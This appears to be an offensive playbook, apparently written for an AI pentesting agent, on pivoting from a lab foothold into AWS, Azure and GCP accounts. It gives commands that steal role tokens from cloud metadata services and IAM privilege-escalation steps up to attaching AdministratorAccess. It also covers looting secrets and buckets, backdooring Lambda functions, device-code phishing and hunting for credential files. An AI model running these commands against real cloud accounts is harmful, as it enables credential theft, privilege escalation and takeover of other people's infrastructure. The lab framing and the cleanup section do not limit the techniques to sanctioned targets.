# Cloud-attached targets

Some lab boxes are a foothold into a cloud account rather than a standalone host.
The bridge is almost always **credential theft → API enumeration → an IAM
misconfiguration that grants more**. The web/host side gets you the first
credential; this file is what to do with it.

Tooling in the container: `aws` CLI, `az` CLI, `gcloud`, `pacu`, `ScoutSuite`,
`cloudfox`, `trufflehog`. Set creds via env or `~/.aws/credentials` and always
confirm who you are first.

## The universal first move: the metadata service (SSRF or shell)

Any SSRF, or a shell on a cloud VM, can reach the instance metadata service and
steal the instance's role credentials.

```bash
# AWS IMDSv1 (no header) — the classic
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>
# AWS IMDSv2 (token required) — two steps
TOK=$(curl -s -X PUT http://169.254.169.254/latest/api/token -H 'X-aws-ec2-metadata-token-ttl-seconds: 60')
curl -s -H "X-aws-ec2-metadata-token: $TOK" http://169.254.169.254/latest/meta-data/iam/security-credentials/
# Azure IMDS (header mandatory)
curl -s -H Metadata:true "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
# GCP (header mandatory)
curl -s -H "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
```

For SSRF specifically, try gopher/redirect/DNS-rebind tricks if a naive fetch is
filtered. In a Kubernetes pod the same IMDS reaches the *node's* role — a common
cluster-to-cloud pivot.

## AWS

### Identify and enumerate
```bash
pwnloop x "aws sts get-caller-identity"                      # who am I, which account
pwnloop x "aws iam get-account-authorization-details"         # everything, if allowed
pwnloop x "cloudfox aws --profile p all-checks"               # fast situational map
pwnloop x "pacu"                                              # then run iam__enum_permissions
```
No `iam:Get*`? Brute the permissions you actually have with
`enumerate-iam`/pacu `iam__bruteforce_permissions` — the error vs success on a
dry-run reveals each action.

### IAM privilege-escalation paths (the money list)
Any **one** of these, granted to your principal, is escalation to admin. Confirm
with `get-caller-identity` after each:

- `iam:CreatePolicyVersion` / `iam:SetDefaultPolicyVersion` → rewrite a policy
  you're attached to, grant `*`.
- `iam:AttachUserPolicy` / `AttachGroupPolicy` / `AttachRolePolicy` → attach
  `AdministratorAccess`.
- `iam:PutUserPolicy` / `PutGroupPolicy` / `PutRolePolicy` → inline an admin
  policy.
- `iam:AddUserToGroup` → join an admin group.
- `iam:CreateAccessKey` (on another user) → mint keys for a more-privileged user.
- `iam:CreateLoginProfile` / `UpdateLoginProfile` → set a console password on a
  privileged user.
- `iam:UpdateAssumeRolePolicy` + `sts:AssumeRole` → make a privileged role
  assumable by you.
- `iam:PassRole` + one of `ec2:RunInstances` / `lambda:CreateFunction` /
  `glue:CreateDevEndpoint` / `cloudformation:CreateStack` /
  `datapipeline:CreatePipeline` / `sagemaker:Create*` → pass a privileged role
  into a compute service you control and read its credentials back.
- `lambda:UpdateFunctionCode` → backdoor an existing function that runs as a
  privileged role.

```bash
pwnloop x "aws iam create-policy-version --policy-arn <arn> --policy-document file://admin.json --set-as-default"
pwnloop x "aws iam attach-user-policy --user-name me --policy-arn arn:aws:iam::aws:policy/AdministratorAccess"
pwnloop x "aws ec2 run-instances --iam-instance-profile Name=<priv-profile> ...  # then read IMDS on it"
```

### Loot without escalation
`s3 ls` / `s3 sync` every readable bucket; `secretsmanager get-secret-value`;
`ssm get-parameters --with-decryption`; `dynamodb scan`; EC2 `describe-instances`
for user-data (`aws ec2 describe-instance-attribute --attribute userData`) — it
routinely contains bootstrap credentials.

## Azure / Entra ID

```bash
pwnloop x "az login --identity"                    # if on a VM with a managed identity
pwnloop x "az account show; az ad signed-in-user show"
pwnloop x "az resource list; az vm list; az keyvault list"
```
- **Managed identity on a VM** → token from IMDS (above) → hit ARM / Graph /
  Key Vault as that identity.
- **Key Vault** → `az keyvault secret list/show` for connection strings and
  passwords; a Contributor on the vault can grant itself an access policy.
- **Entra roles** → `Application Administrator` / `Cloud App Admin` can add
  credentials to a service principal and log in as it; `Privileged Role Admin`
  can grant Global Admin. Enumerate with `roadrecon`/`AzureHound`.
- **RunCommand** on a VM (`az vm run-command invoke`) with Contributor = SYSTEM
  on that VM.
- **Device Code phishing** for the admin-bot scenario:
  `az login` device flow relayed to a victim.

## GCP

```bash
pwnloop x "gcloud auth list; gcloud config list"
pwnloop x "gcloud projects list; gcloud iam service-accounts list"
```
- **Token from metadata** (above) → act as the instance service account.
- **`iam.serviceAccounts.getAccessToken` / `actAs`** on a more-privileged SA →
  impersonate it: `gcloud --impersonate-service-account=<sa> ...`.
- **`iam.serviceAccounts.implicitDelegation`**, **`setIamPolicy`** on a project →
  grant yourself `owner`.
- **Compute `setMetadata`** → add an SSH key to a VM, or a startup script that
  runs as the SA.
- **Storage** → `gsutil ls`/`cp` every readable bucket.

## Cloud-to-on-prem and back

The pivot runs both ways: a stolen SA/role can reach a VPN'd on-prem host, and an
on-prem foothold that finds `~/.aws/credentials`, an `az` token cache, a
`gcloud` config, a Terraform state file, or CI secrets pivots *into* the cloud.
Grep every foothold for these before assuming the box is standalone:
`.aws/`, `.azure/`, `.config/gcloud/`, `*.tfstate`, `terraform.tfvars`,
`serviceaccount*.json`, `.kube/config`.

## Cleanup

Cloud artifacts persist and cost money. Remove every access key, login profile,
policy version, attached policy, role, instance, function, and IAM binding you
created — in reverse order — and verify with a fresh `get-caller-identity` /
`az role assignment list` / `gcloud projects get-iam-policy`. Note anything you
could not remove (a resource that would break the lab) in the ledger with the
exact deletion command.
